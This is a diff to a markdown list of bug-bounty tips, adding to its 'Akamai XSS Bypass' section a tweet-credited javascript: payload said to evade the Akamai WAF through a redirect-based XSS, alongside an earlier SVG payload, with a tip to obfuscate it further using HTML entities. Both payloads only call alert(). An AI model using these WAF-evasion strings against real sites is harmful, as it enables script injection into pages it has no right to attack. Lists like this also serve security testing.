@@ -17,10 +17,20 @@
 
 ## Akamai XSS Bypass
 
-[Tweet](https://twitter.com/aisecureme/status/1240354605520678913) By [AISECUREME](https://twitter.com/aisecureme)
+*[Tweet](https://twitter.com/aisecureme/status/1240354605520678913) By [AISECUREME](https://twitter.com/aisecureme)*
 ```html
 “><svg/on</script>laod=alert>
 ```
+
+*[Tweet](https://twitter.com/saamux/status/1238449598051516418) By [saamux](https://twitter.com/saamux)*
+
+A good way to bypass the Akamai WAF by exploiting a redirect-based XSS is with the following payload:
+
+```javascript
+javascript:new%20Function`al\ert\`1\``;
+```
+You can also obfuscate it using HTML entities
+
 ------------------------------------------------------------------------------------------
 
 ## WAF/filter Bypass
